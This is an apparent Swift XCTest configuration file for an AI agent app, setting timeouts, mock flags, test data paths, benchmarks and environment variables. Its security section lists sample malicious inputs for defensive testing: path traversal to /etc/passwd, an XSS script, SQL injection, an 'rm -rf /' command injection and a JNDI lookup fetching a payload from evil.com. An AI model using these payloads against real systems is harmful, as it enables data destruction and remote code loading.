import XCTest
import Foundation

class TestConfig {
    static let shared = TestConfig()
    
    private init() {}
    
    // Test Configuration
    let testTimeout: TimeInterval = 10.0
    let asyncTestTimeout: TimeInterval = 30.0
    let performanceTestTimeout: TimeInterval = 60.0
    
    // Mock Configuration
    let useMockLLMClient = true
    let useMockFileSystem = true
    let useMockNetworking = true
    
    // Test Data Paths
    var testDataDirectory: URL {
        return Bundle(for: TestConfig.self)
            .url(forResource: "TestData", withExtension: nil) ??
            URL(fileURLWithPath: "Tests/TestUtilities/TestData")
    }
    
    var fixturesDirectory: URL {
        return testDataDirectory.appendingPathComponent("Fixtures")
    }
    
    var conversationsDirectory: URL {
        return testDataDirectory.appendingPathComponent("Conversations")
    }
    
    var configurationsDirectory: URL {
        return testDataDirectory.appendingPathComponent("Configurations")
    }
    
    var apiResponsesDirectory: URL {
        return testDataDirectory.appendingPathComponent("API_Responses")
    }
    
    // Performance Benchmarks
    struct PerformanceBenchmarks {
        static let llmResponseStartTime: TimeInterval = 0.5
        static let uiUpdateTime: TimeInterval = 0.016 // 60fps
        static let toolExecutionTime: TimeInterval = 2.0
        static let appStartupTime: TimeInterval = 3.0
        
        static let baseMemoryUsage: Int = 100 * 1024 * 1024 // 100MB
        static let conversationMemoryPerMessage: Int = 10 * 1024 // 10KB
        static let streamingMemoryLimit: Int = 50 * 1024 * 1024 // 50MB
    }
    
    // Security Test Configuration
    struct SecurityConfig {
        static let testAPIKey = "test_api_key_that_should_never_be_used"
        static let invalidAPIKey = "invalid_key"
        static let maliciousInput = [
            "../../../etc/passwd",
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "$(rm -rf /)",
            "${jndi:ldap://evil.com/payload}"
        ]
    }
    
    // Test Environment Setup
    func setupTestEnvironment() {
        // Set test environment variables
        setenv("TEST_MODE", "1", 1)
        setenv("ANTHROPIC_API_KEY", SecurityConfig.testAPIKey, 1)
        setenv("LLM_ENDPOINT", "http://localhost:8080/test", 1)
        
        // Clean up any existing test data
        cleanupTestData()
        
        // Create test directories if needed
        createTestDirectories()
    }
    
    func teardownTestEnvironment() {
        cleanupTestData()
        
        // Unset test environment variables
        unsetenv("TEST_MODE")
        unsetenv("ANTHROPIC_API_KEY")
        unsetenv("LLM_ENDPOINT")
    }
    
    private func createTestDirectories() {
        let directories = [
            testDataDirectory,
            fixturesDirectory,
            conversationsDirectory,
            configurationsDirectory,
            apiResponsesDirectory
        ]
        
        for directory in directories {
            try? FileManager.default.createDirectory(
                at: directory,
                withIntermediateDirectories: true,
                attributes: nil
            )
        }
    }
    
    private func cleanupTestData() {
        let tempTestDirectory = FileManager.default.temporaryDirectory
            .appendingPathComponent("AIAgentTests")
        
        try? FileManager.default.removeItem(at: tempTestDirectory)
    }
}